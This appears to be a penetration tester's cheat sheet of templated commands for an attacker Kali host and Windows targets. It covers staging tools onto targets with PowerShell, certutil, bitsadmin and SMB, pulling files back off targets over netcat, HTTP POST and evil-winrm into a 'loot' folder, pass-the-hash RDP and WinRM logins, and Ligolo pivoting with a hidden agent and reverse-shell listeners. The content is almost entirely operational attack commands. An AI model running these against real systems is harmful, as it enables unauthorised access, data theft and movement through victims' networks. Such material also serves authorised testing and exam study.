# === KALI: START SERVERS ===
# HTTP server (serve files to target)
python3 -m http.server {{KALI_PORT}}
# Upload receiver (needed for PowerShell POST uploads)
python3 -m uploadserver {{KALI_PORT}}
# SMB share (most reliable for Windows - no PowerShell needed)
sudo impacket-smbserver share . -smb2support
sudo impacket-smbserver share . -smb2support -username {{USER}} -password {{PASS}}
# Netcat listener
rlwrap nc -nvlp {{KALI_PORT}}

# === WINDOWS: DOWNLOAD FROM KALI ===
# PowerShell IWR (preferred)
powershell -nop -c "iwr http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} -OutFile C:\Windows\Temp\{{FILENAME}}"
powershell -nop -c "(New-Object Net.WebClient).DownloadFile('http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}','C:\Windows\Temp\{{FILENAME}}')"
# certutil (when PowerShell blocked)
certutil -urlcache -split -f http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
# bitsadmin (last resort - older Windows)
bitsadmin /transfer job /download /priority normal http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} C:\Windows\Temp\{{FILENAME}}
# SMB (no HTTP needed)
copy \\{{KALI}}\share\{{FILENAME}} C:\Windows\Temp\{{FILENAME}}

# === WINDOWS: UPLOAD TO KALI ===
# PowerShell POST to uploadserver
powershell -c "Invoke-WebRequest -Uri http://{{KALI}}:{{KALI_PORT}}/upload -Method POST -InFile C:\path\to\file"
# SMB copy to share
copy C:\path\to\file \\{{KALI}}\share\{{FILENAME}}
# Netcat (start nc -lvnp {{KALI_PORT}} > outfile on Kali first)
type C:\path\to\file | C:\Windows\Temp\nc.exe {{KALI}} {{KALI_PORT}}
# WinRM (if evil-winrm session active)
download C:\path\to\file /home/kali/loot/{{FILENAME}}
# Base64 encode for copy-paste
powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\to\file'))"
certutil -hashfile {{FILENAME}} MD5

# === RDP WITH KALI SHARE ===
# Maps /home/kali/tmp as a drive inside the RDP session
xfreerdp3 /cert-ignore /u:{{USER}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/tmp
xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/tmp
# Pass the hash RDP
xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /pth:{{NTLM_HASH}} /v:{{TARGET}} /drive:share,/home/kali/tmp
# Inside RDP session - copy from Kali share
copy \\tsclient\share\{{FILENAME}} C:\Windows\Temp\{{FILENAME}}

# === WINRM / EVIL-WINRM ===
evil-winrm -i {{TARGET}} -u {{USER}} -p {{PASS}}
evil-winrm -i {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
upload /home/kali/tmp/{{FILENAME}} C:\Windows\Temp\{{FILENAME}}

# === LIGOLO: SINGLE PIVOT SETUP (AD / PIVOTING) ===
# Step 1 - Create TUN interface on Kali (one-time setup)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
# Step 2 - Start Ligolo proxy on Kali
sudo ligolo-proxy -selfcert
# Step 3 - Run agent on pivot host (Windows)
Start-Process -WindowStyle Hidden -FilePath "C:\temp\agent.exe" -ArgumentList "-connect {{KALI}}:11601 -ignore-cert"
# Step 3 - Run agent on pivot host (Linux)
/tmp/agent -connect {{KALI}}:11601 -ignore-cert
# Step 4 - In proxy: select session and start tunnel
session
start
# Step 5 - Add route to internal subnet on Kali
sudo ip route add {{SUBNET}}.0/24 dev ligolo
# Step 6 - Verify route
ip route | grep ligolo
# Ligolo listener for reverse shells through tunnel (run inside proxy session)
listener_add --addr 0.0.0.0:{{KALI_PORT}} --to 127.0.0.1:{{KALI_PORT}} --tcp
